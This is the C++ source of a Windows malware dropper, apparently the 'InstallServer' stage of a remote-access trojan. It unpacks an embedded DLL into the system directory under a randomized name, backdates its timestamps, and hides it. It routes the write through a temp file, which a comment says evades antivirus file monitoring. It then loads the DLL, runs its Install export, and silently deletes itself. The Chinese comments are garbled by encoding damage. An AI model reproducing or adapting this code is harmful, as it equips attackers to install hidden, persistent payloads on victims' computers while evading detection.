// InstallServer.cpp : Defines the entry point for the application.
//
#include "resource.h"
#include <windows.h>
#include "TLHELP32.H"
#pragma comment(linker,"/OPT:NOWIN98")
#pragma comment(linker, "/STUB:stub.bin")

int SEU_RandEx(int min, int max)
{
	if(min == max)
		return min;

	srand(GetTickCount());
	int seed=rand()+3;

	return seed % (max - min + 1) + min;
}

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath)
{
	HGLOBAL hResData;
	HRSRC   hResInfo;
	HANDLE  hFile;
	DWORD   dwBytes;

	char strTmpPath[MAX_PATH], strBinPath[MAX_PATH];

	// һ��Ҫ��������ֿ���GetTickCount�п��ܵõ�һ����ֵ
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_res.tmp", strTmpPath, GetTickCount());
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL) return FALSE;

	hFile = CreateFile(strBinPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear   = 2004;
	st.wMonth  = 8;
	st.wDay    = 17;
	st.wHour   = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);

	WriteFile(hFile, hResData, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);
	
	// Fuck KV File Create Monitor
	MoveFile(strBinPath, lpFilePath);
	SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(strBinPath);

	return TRUE;
}

void DelSelf()
{
	char szModule [MAX_PATH],
		 szComspec[MAX_PATH],
		 szParams [MAX_PATH];
	// �õ��ļ�·��:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
	(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
	(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// �����������
		wsprintf(szParams," /c del %s > nul",szModule);
		lstrcat(szComspec,szParams);
		
		// ���ýṹ���Ա
		STARTUPINFO  si={0};
		PROCESS_INFORMATION pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		// Ϊ���������Դ
		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
		
		// ��������
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// ��ͣ����ֱ�������˳�
			::SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			::SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
			// �ָ�������õ�����Ȩ
			::ResumeThread(pi.hThread);
			return;
		}
		else // �����������ʽ������Ŀռ�
		{
			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}

//////////////////////////////////////////////////////////////////////////////
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	char szDllPath[MAX_PATH],szSysPath[MAX_PATH];
    GetSystemDirectory(szSysPath, MAX_PATH);
	wsprintf(szDllPath,"%s\\R%cm%ct%cC.dll",szSysPath,SEU_RandEx('a','z'),SEU_RandEx('b','y'),SEU_RandEx('c','x'));

	ReleaseResource(NULL, IDR_DLL, "DLL", szDllPath);//�ͷ�DLL�ļ�

    HMODULE hModule = LoadLibrary(szDllPath);
	if (hModule)
	{
		BOOL (_stdcall *InstallFuc)(LPCSTR szDllPath);
		(FARPROC&)InstallFuc= GetProcAddress(hModule,"Install");
		if(InstallFuc) InstallFuc(szDllPath);
		FreeLibrary(hModule);
	}

	DelSelf();                           //��ɾ��
	return 0;
}